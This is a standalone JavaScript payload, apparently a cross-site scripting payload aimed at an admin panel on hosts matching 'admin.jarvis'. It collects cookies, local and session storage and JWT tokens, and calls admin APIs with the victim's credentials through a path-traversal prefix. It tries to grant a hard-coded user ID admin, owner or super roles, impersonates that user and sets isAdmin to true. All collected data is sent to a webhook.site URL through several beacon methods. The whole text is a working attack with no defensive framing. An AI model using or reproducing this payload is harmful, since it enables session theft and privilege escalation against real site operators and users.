(async()=>{
try{
if(!String(location.hostname||'').match(/admin\.jarvis/)){return;}
const C='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14';
const UID='01967db5-ae00-4642-96ba-f82321e15ef0';
const out={t:Date.now(),host:location.hostname,href:location.href,ua:navigator.userAgent,cookie:'',cs:'',ls:{},ss:{},jwt:'',pulls:{},assign:{}};
try{out.cookie=document.cookie||'';}catch(e){}
try{if(window.cookieStore&&cookieStore.getAll){out.cs=await cookieStore.getAll();}}catch(e){}
try{for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);const v=localStorage.getItem(k)||'';out.ls[k]=v.substring(0,500);if(!out.jwt&&v.startsWith('eyJ'))out.jwt=v;}}catch(e){}
try{for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);const v=sessionStorage.getItem(k)||'';out.ss[k]=v.substring(0,500);if(!out.jwt&&v.startsWith('eyJ'))out.jwt=v;}}catch(e){}
const prefs=['/api/session/login/../../v1/','/api/v1/','/api/'];
async function pull(tag,path,opt){
  for(const pref of prefs){
    const url=path.startsWith('http')?path:(pref+path.replace(/^\//,''));
    try{
      const r=await fetch(url,Object.assign({credentials:'include',headers:{'Accept':'application/json'}},opt||{}));
      const t=await r.text();
      out.pulls[tag]={status:r.status,url,body:t.substring(0,1800)};
      if(r.status&&r.status<500)return out.pulls[tag];
    }catch(e){out.pulls[tag+'_e']=String(e).substring(0,80);}
  }
  return out.pulls[tag];
}
await pull('me','me');
await pull('roles','admin/roles');
await pull('users','admin/users?page=1&pageSize=20');
await pull('user','admin/users/'+UID);
let roles=[];
try{
  const j=JSON.parse((out.pulls.roles&&out.pulls.roles.body)||'{}');
  roles=Array.isArray(j.data)?j.data:(Array.isArray(j)?j:[]);
}catch(e){}
const prefer=roles.filter(r=>/admin|super|owner|root|manage/i.test(String(r.name||r.title||'')));
const queue=(prefer.concat(roles)).filter((r,i,a)=>r&&r.id&&a.findIndex(x=>x.id===r.id)===i).slice(0,8);
for(const role of queue){
  const tag='as_'+String(role.name||role.id).substring(0,18);
  await pull(tag,'admin/users/'+UID+'/roles',{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({roleId:role.id})});
  await pull(tag+'b','admin/users/'+UID+'/roles/'+role.id,{method:'PUT',headers:{'Accept':'application/json'}});
  await pull(tag+'c','admin/users/'+UID,{method:'PUT',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({roleIds:[role.id],roles:[role.id]})});
}
out.assign.count=queue.length;
await pull('imp','admin/users/'+UID+'/impersonate',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
await pull('upd','admin/users/'+UID,{method:'PUT',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({isAdmin:true,roles:['Admin']})});
const q=new URLSearchParams({s:String(queue.length),j:out.jwt?'1':'0',ck:(out.cookie||'').substring(0,180),h:(out.href||'').substring(0,80)});
const body=JSON.stringify(out);
function boom(url){
  try{new Image().src=url+(url.includes('?')?'&':'?')+q.toString();}catch(e){}
  try{fetch(url,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:body});}catch(e){}
  try{navigator.sendBeacon&&navigator.sendBeacon(url,new Blob([body],{type:'text/plain'}));}catch(e){}
  try{const s=document.createElement('script');s.src=url.split('?')[0]+'?'+q.toString();(document.documentElement||document.head).appendChild(s);}catch(e){}
}
boom(C);
try{fetch('/api/session/login/../../v1/me?ja='+encodeURIComponent(q.toString()),{credentials:'include'});}catch(e){}
}catch(e){
  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+encodeURIComponent(String(e).substring(0,160));}catch(x){}
}
})();
